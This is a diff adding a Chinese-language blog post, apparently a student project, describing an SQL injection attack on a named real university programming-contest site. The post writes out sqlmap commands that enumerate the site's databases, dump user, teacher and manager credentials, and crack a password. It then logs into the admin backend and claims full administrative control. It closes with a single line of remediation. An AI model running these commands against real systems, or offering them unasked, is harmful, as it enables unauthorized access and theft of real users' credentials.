@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          SQL Injection Attack Project - fawks96
+        
+    </title>
+
+    <link rel="canonical" href="http://fawks96.github.io/2020/01/23/SQL Injection Attack Project/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('post_header.jpg')
+            /*post*/
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/BeanTechSign-black.jpg');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#编程" title="编程">编程</a>
+                            
+                        </div>
+                        <h1>SQL Injection Attack Project</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by fawks96 on
+                            2020-01-23
+                        </span>
+			</br>
+  <span class="head-plus">   
+	<i class="fa fa-user"></i>
+ <span id="busuanzi_value_page_pv">
+	<i class="fa fa-spinner fa-spin"></i>
+ </span>  </span>  
+ </span> 
+
+
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
+
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Jinhua Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>用SQLMAP对 <a href="http://acm.cs.ecnu.edu.cn" target="_blank" rel="noopener">acm.cs.ecnu.edu.cn</a> 进行扫描，发现存在注入点：<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a></p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片1.png)</p>
+<p>对其进行注入并读取出网站的各个数据库名称：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片2.png)</p>
+<p>得出网站由三个数据库组成：acm、eoj、information_schema</p>
+<p>执行命令：&quot;./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm–tables&quot;曝出acm数据库里所有的表名：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片3.png)</p>
+<p>同理分别执行命令&quot;./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>”<br>
+-D eoj –tables”和“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D information_schema –tables&quot;曝出eoj数据库和information_schema数据库的表名称：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片4.png) ![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片5.png)</p>
+<p>继续深入挖掘数据库表的schema，尝试获取acm数据库里的各张表的schema，分别执行命令“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T user --columns”(其中把-T 后的命令项分别改为其他的表名就可尝试获取对应表的Schema,获取到：</p>
+<p>user表的schema：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片6.png)</p>
+<p>user_group表的schema:</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片7.png)</p>
+<p>user_group_name表的schema：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片8.png)</p>
+<p>teacher表的schema:</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片9.png)</p>
+<p>manage表的schema：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片10.png)</p>
+<p>尝试获取一位用户的用户名和密码，尝试dump user表里的“id，name，password”，执行命令：“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T user –C “id,name,password” –-start 1 –-stop 1 --dump”</p>
+<p>成功获取到一位用户的账户名和密码：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片11.png)</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片12.png)</p>
+<p>使用解密工具进行解密：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片13.png)</p>
+<p>用该用户名和密码成功登陆上该用户账户：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片14.png)</p>
+<p>可以查看该用户以往所有提交过的代码：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片15.png)</p>
+<p><strong>注：事实上虽然这一个账号是在user表里被获取出来的而不是从teacher表或manager表中获取出来的，但由于在dump的时候读取的是存在表中的第一个条目，因此这一账号很可能是网站建设初始阶段的管理员身份的账号，事实上这个账号确实不是普通的账号，是拥有极高权限的管理员账号，这一点在后面的dump manager表出来的数据可以印证这一点。</strong></p>
+<p>下面执行命令：“./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T teacher –C “name,password” --dump”</p>
+<p>和 “./sqlmap.py -u “<a href="http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&amp;set=2</a>” -D acm –T manager –C “user,password,viewcode_priv”–dump”</p>
+<p>分别获取teacher表和manager表中的用户名和密码等条目：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片16.png)</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片17.png)</p>
+<p>正如之前所提到的，用户”lcftc”在manager中存在，且拥有查阅他人代码的权限。</p>
+<p>简单尝试了几个后台的登录域名，猜中域名“<a href="http://acm.cs.ecnu.edu.cn/manage/managelogin.php%E2%80%9D" target="_blank" rel="noopener">http://acm.cs.ecnu.edu.cn/manage/managelogin.php”</a> 为平台的后台登录界面：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片18.png)</p>
+<p>利用先前获取的lcftc用户的密码进行登录，成功进入后台管理界面：</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片19.png)</p>
+<p>![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片20.png)</p>
+<p><font color="red"><strong>至此，成功拥有了发布题目，修改任意题目内容，查看任何人的任何代码等最高管理权限</strong></font></p>
+<p>为漏洞的解决提出解决方案或防范方法：</p>
+<p>过滤请求参数，使用参数化的SQL或直接使用存储过程进行数据查询存取等。</p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2020/01/22/朝花夕拾——项目整理/" data-toggle="tooltip" data-placement="top" title="朝花夕拾——项目整理">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#编程" title="编程">编程</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>QUICK LINKS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://www.sei.ecnu.edu.cn/" target="_blank">华东师范大学计算机科学与软件工程学院</a></li>
+                    
+                        <li><a href="http://www.au.tsinghua.edu.cn/" target="_blank">清华大学自动化系</a></li>
+                    
+                        <li><a href="http://blog.csdn.net/fawks96" target="_blank">fawks96的专栏</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://fawks96.github.io/2020/01/23/SQL Injection Attack Project/";
+    var disqus_url = "http://fawks96.github.io/2020/01/23/SQL Injection Attack Project/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/hua-zhu-xi-68">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/chenjinhuablog">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+		 
+                <li>
+                    <a target="_blank"  href="http://jinhua.io/img/wechat.png">
+                        <span class="fa-stack fa-lg">
+                            <i class="fa fa-circle fa-stack-2x"></i>
+                            <i class="fa fa-wechat fa-stack-1x fa-inverse"></i>
+                        </span>
+                    </a>
+                </li>
+            
+
+	     
+                <li>
+                    <a target="_blank"  href="https://user.qzone.qq.com/443118619">
+                        <span class="fa-stack fa-lg">
+                            <i class="fa fa-circle fa-stack-2x"></i>
+                            <i class="fa fa-qq fa-stack-1x fa-inverse"></i>
+                        </span>
+                    </a>
+                </li>
+            
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; fawks96 2020 
+			<br /><br />
+		    <span id="busuanzi_container_site_pv">
+    			总访问量<span id="busuanzi_value_site_pv"></span>次
+    			你是第<span id="busuanzi_value_site_uv"></span>位访客
+			</span>
+                    <br>
+		   
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://fawks96.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="http://fawks96.github.io/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
